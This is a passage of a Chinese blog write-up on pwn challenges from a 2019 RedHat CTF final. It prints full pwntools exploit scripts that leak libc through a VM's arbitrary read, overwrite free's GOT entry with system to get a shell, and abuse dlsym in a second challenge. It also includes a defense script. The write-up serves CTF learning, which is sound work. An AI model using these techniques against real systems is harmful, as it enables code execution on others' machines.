class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-粤湾银行"><a href="#0x02-粤湾银行" class="headerlink" title="0x02 粤湾银行"></a>0x02 粤湾银行</h2><p>这是一道32位的pwn,比赛的时候没逆清楚，赛后复现出来了。</p>
+<p>开启保护：</p>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)</code></pre><p>该题的结构体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 Vminfo          struc ; (sizeof=0x2C)</span><br><span class="line">00000000 reg             dd 6 dup(?)</span><br><span class="line">00000018 _ESP            dd ?</span><br><span class="line">0000001C _EBP            dd ?</span><br><span class="line">00000020 _EIP            dd ?</span><br><span class="line">00000024 field_24        dd ?</span><br><span class="line">00000028 stack_ptr       dd ?</span><br><span class="line">0000002C Vminfo          ends</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这一题用到了三个指令。这一题有三个指令可以达到任意地址读写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span><span class="comment">#将立即数放到任意寄存器</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span><span class="comment">#打印出reg[3]地址上的一个字节</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span><span class="comment">#写一个字节到reg[3]存放的地址上</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span><span class="comment">#将任意寄存器的值加一</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br></pre></td></tr></table></figure>
+<p>通过上面四条指令可以达到任意地址的读写</p>
+<p>我的思路是首先将got表泄露出来，然后劫持free的got表，从而达到getshell</p>
+<p>当然，VM是很灵活的解题，解题思路不止一种，因为我只用到了他为数不多的几个指令，还有其他完全不同的思路解题。这就是我喜欢VM的原因，全靠自己逆向，自己的自由度很高，这一题还有一种思路就是通过寄存器的越界读写，修改存放栈的地址，改为got表，也能达到劫持got表的目的，这个想法应该是可行的，就和第一道题的思路类似。</p>
+<p>我的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    script=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x80489A3</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(p,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br><span class="line"></span><br><span class="line">payload=movimm(<span class="number">3</span>,<span class="number">0x0804B014</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()</span><br><span class="line">payload+=<span class="string">'\xb0'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">free()</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system_addr=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=movimm(<span class="number">0</span>,u32(<span class="string">'sh\x00\x00'</span>))+movimm(<span class="number">3</span>,<span class="number">0x804B018</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+<span class="string">'\xb0'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p32(system_addr)[<span class="number">0</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">1</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">2</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">3</span>])</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于怎么防守，说实话，我是没怎么想清楚怎么去防守。因为利用点太多了，真的很困难。</p>
+<h2 id="0x03-粤湾证券"><a href="#0x03-粤湾证券" class="headerlink" title="0x03 粤湾证券"></a>0x03 粤湾证券</h2><p>这道题是一个攻守兼备的一个VM，根据他提供的VM 来进行逆向分析他的指令集，然后再通过你提供的defense脚本和payload来进行一个攻守兼备的一个模式。</p>
+<p>首先看一下这一题开启的保护</p>
+<pre><code>Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled</code></pre><p>这一道题很无脑，因为它调用了dlsym,通过这个函数可以直接调用system。不过当时在现场不太了解这个函数，并且没有外网环境，并不知道这个函数用法。对这个函数进行盲测花了很长时间导致其他题没时间做了。这个函数把libc当做handle,第二参数为函数名称的字符串，就会返回函数的真实地址。所以这道题一点都不难，不过可惜在于当时一直以为是函数在libc的偏移量作为函数第二个参数，返回函数真实地址。</p>
+<p>我的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn2"</span>)</span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"><span class="comment">#p=remote("172.16.9.41",9002)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(code)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Give me code:"</span>,base64.b64encode(code))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift:0x"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gift=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">"gift====&gt;0x%x"</span>%gift)</span><br><span class="line">code=p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(gift+<span class="number">0x0001B3E9A</span>)+p64(<span class="number">0x40</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(gift+<span class="number">0x0001B3E9A</span>)</span><br><span class="line">new(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我的编写defense的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/defense"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(p64(<span class="number">0x20</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))))</span><br></pre></td></tr></table></figure>
+
+<p>个人觉得，这个题是最好玩的一个题，希望以后的比赛多来点这种题。不是因为简单，而是因为这个题这种攻守兼备的模式。以题目作为媒介，自己编写攻击和防御脚本来进行对抗，这一点我特别喜欢。不像传统的AWD，通过去修改文件，来修复漏洞，那样少了许多攻击灵活性，但是也不像前道VM题攻击的那么灵活，让你修的无法下手，增加了许多防守的稳定性。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至Whali3n51@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>ReaHat_final_pwn</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" target="_blank" rel="noopener" title="Whali3n51">Whali3n51</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-11-28, 23:30:00</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-28, 23:23:42</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/28/RedHat/" title="ReaHat_final_pwn">http://whali3n51.github.io/2019/11/28/RedHat/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: '',
+            clientSecret: '',
+            repo: 'Whali3n51.github.io',
+            owner: 'Whali3n51',
+            admin: ['Whali3n51'],
+            id: decodeURI(location.pathname),
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019 Whali3n51</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)" target="_blank" rel="noopener"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#WP复现','#pwn','#re_wp','#re复现','#Writeup',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://s9.rr.itc.cn/r/wapChange/20166_15_14/a1h0j307059539839596.JPEG");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/Whali3n51">github</a>
+    
+</div>
+
+
+</html>
